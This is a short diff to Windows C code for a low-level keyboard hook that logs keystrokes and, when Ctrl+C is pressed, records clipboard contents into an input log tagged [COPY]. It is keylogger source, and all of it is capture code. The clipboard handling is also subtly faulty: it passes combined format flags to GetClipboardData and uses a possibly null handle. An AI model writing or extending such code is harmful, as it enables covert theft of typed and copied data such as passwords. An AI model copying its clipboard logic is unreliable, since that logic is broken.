@@ -41,8 +41,6 @@ void CALLBACK win_foreground(HWINEVENTHOOK hWinEventHook, // Handle to the event
 LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
 {
 
-    // kCode, pkey->scanCode, keyboardState, unicodeBuffer, 4, 0);
-
     KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
     DWORD   kCode = 0;
     // (void)GetClipboardData(NULL);
@@ -86,11 +84,10 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
                 if (GetAsyncKeyState(VK_LCONTROL) && kCode == 'C') // c moche
                 {
                     DBG("LCTRL + C");
-                    if (GetClipboardData(CF_TEXT) != 0)
-                        EmptyClipboard();
                     if (!OpenClipboard(NULL))
                         return 1;
-                    HANDLE clipB = GetClipboardData(CF_TEXT);
+                    // SetClipboardData(CF_TEXT, NULL);
+                    HANDLE clipB = GetClipboardData(CF_TEXT | CF_UNICODETEXT);
                     if (!clipB)
                         CloseClipboard();
                     sprintf_s(inputLog, sizeof(inputLog), "[COPY]%s[/COPY]", (char*)GlobalLock(clipB));
